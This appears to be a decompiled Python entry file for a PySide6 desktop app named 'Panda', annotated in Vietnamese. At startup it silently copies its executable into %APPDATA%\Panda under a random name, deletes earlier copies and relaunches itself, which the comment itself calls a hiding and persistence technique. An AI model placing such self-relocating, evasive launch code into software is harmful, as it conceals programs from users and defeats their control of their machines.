# ============================================================
# main.py  —  reconstructed from Python 3.13 bytecode
# Entry point: splash screen, tự sao chép vào %APPDATA%\\Panda với
# tên ngẫu nhiên rồi chạy lại (kỹ thuật ẩn/persistence).
# ============================================================
import sys
import os
import shutil
import random
import string
import subprocess
from PySide6.QtWidgets import QApplication, QLabel
from PySide6.QtCore import Qt, QTimer, QPropertyAnimation
from PySide6.QtGui import QIcon
from main_app import MainApp
from login import LoginPage
import utils


def random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def get_appdata_folder():
    appdata = os.getenv("APPDATA")
    folder = os.path.join(appdata, "Panda")
    os.makedirs(folder, exist_ok=True)
    return folder


def cleanup_old_exes(folder):
    for file in os.listdir(folder):
        if file.endswith(".exe"):
            try:
                os.remove(os.path.join(folder, file))
            except Exception:
                pass


def clone_and_run_in_appdata():
    exe_path = sys.argv[0]
    folder = get_appdata_folder()
    cleanup_old_exes(folder)
    new_name = f"{random_name()}.exe"
    new_path = os.path.join(folder, new_name)
    shutil.copy(exe_path, new_path)
    subprocess.Popen([new_path])
    sys.exit()


# Nếu đang chạy ở dạng đóng gói (frozen) và KHÔNG nằm trong %APPDATA%\\Panda
# thì tự nhân bản vào đó rồi chạy lại.
if getattr(sys, "frozen", False):
    current_path = os.path.abspath(sys.argv[0])
    appdata_folder = get_appdata_folder()
    if not current_path.lower().startswith(appdata_folder.lower()):
        clone_and_run_in_appdata()


def fade_out(widget, on_done):
    anim = QPropertyAnimation(widget, b"windowOpacity")
    anim.setDuration(600)
    anim.setStartValue(1)
    anim.setEndValue(0)
    anim.finished.connect(lambda: (widget.close(), on_done()))
    anim.start()
    widget.anim = anim


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setWindowIcon(QIcon(utils.resource_path("resources\\icon.ico")))

    splash = QLabel("\u1ee8ng d\u1ee5ng \u0111ang \u0111\u01b0\u1ee3c kh\u1edfi \u0111\u1ed9ng...")
    splash.setWindowFlag(Qt.FramelessWindowHint)
    splash.setWindowFlag(Qt.WindowStaysOnTopHint)
    splash.setAlignment(Qt.AlignCenter)
    splash.setStyleSheet("""
        background-color: #1e293b;
        color: white;
        font-size: 18px;
        padding: 30px;
        border-radius: 12px;
        border: 1px solid #334155;
    """)
    splash.resize(360, 120)
    splash.show()

    def start_main():
        global main_app, login_page
        main_app = MainApp()
        login_page = LoginPage(main_app, main_app.stacked_widget)

        def wait_until_visible():
            if main_app.isVisible():
                fade_out(splash, lambda: None)
                return
            QTimer.singleShot(100, wait_until_visible)

        main_app.show()
        wait_until_visible()

    QTimer.singleShot(200, start_main)
    sys.exit(app.exec())
